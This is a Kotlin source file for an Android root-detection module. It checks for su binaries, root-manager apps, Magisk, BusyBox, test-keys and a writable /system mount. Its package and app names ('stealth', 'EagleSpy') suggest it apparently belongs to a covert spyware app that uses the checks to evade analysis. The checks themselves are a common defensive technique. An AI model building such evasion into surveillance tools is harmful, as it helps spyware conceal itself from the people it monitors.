package com.stealth.eaglespy.security

import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

/**
 * Root Detection Module
 * Multi-layer detection for rooted devices
 */
object RootDetector {

    /**
     * Comprehensive root detection
     * Returns true if device is likely rooted
     */
    fun isRooted(): Boolean {
        return checkRootBinaries() ||
               checkSuBinary() ||
               checkRootManagementApps() ||
               checkRWPaths() ||
               checkTestKeys() ||
               checkMagisk() ||
               checkBusyBox()
    }

    /**
     * Check for common root binaries
     */
    private fun checkRootBinaries(): Boolean {
        val paths = arrayOf(
            "/system/bin/su",
            "/system/xbin/su",
            "/sbin/su",
            "/system/su",
            "/system/bin/.ext/.su",
            "/system/usr/we-need-root/su-backup",
            "/system/xbin/mu",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/data/local/su",
            "/su/bin/su"
        )

        return paths.any { File(it).exists() }
    }

    /**
     * Try to execute su command
     */
    private fun checkSuBinary(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("/system/xbin/which", "su"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            reader.readLine() != null
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Check for root management applications
     */
    private fun checkRootManagementApps(): Boolean {
        val packages = arrayOf(
            "com.noshufou.android.su",
            "com.noshufou.android.su.elite",
            "eu.chainfire.supersu",
            "com.koushikdutta.superuser",
            "com.thirdparty.superuser",
            "com.yellowes.su",
            "com.topjohnwu.magisk",
            "com.kingroot.kinguser",
            "com.kingo.root",
            "com.smedialink.oneclickroot",
            "com.zhiqupk.root.global",
            "com.alephzain.framaroot"
        )

        val pm = com.stealth.eaglespy.EagleSpyApp.instance.packageManager
        
        return packages.any { pkg ->
            try {
                pm.getPackageInfo(pkg, 0)
                true
            } catch (e: Exception) {
                false
            }
        }
    }

    /**
     * Check for read-write paths that should be read-only
     */
    private fun checkRWPaths(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec("mount")
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            reader.close()

            // /system should be read-only
            output.contains("/system") && output.contains("rw,")
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Check for test-keys in build tags (indicates custom ROM)
     */
    private fun checkTestKeys(): Boolean {
        val buildTags = android.os.Build.TAGS
        return buildTags != null && buildTags.contains("test-keys")
    }

    /**
     * Specific Magisk detection
     */
    private fun checkMagisk(): Boolean {
        val magiskPaths = arrayOf(
            "/sbin/.magisk",
            "/sbin/magisk",
            "/data/adb/magisk",
            "/data/adb/magisk.img",
            "/data/adb/magisk.db"
        )

        return magiskPaths.any { File(it).exists() }
    }

    /**
     * Check for BusyBox installation
     */
    private fun checkBusyBox(): Boolean {
        val busyboxPaths = arrayOf(
            "/system/xbin/busybox",
            "/system/bin/busybox",
            "/sbin/busybox"
        )

        return busyboxPaths.any { File(it).exists() }
    }
}
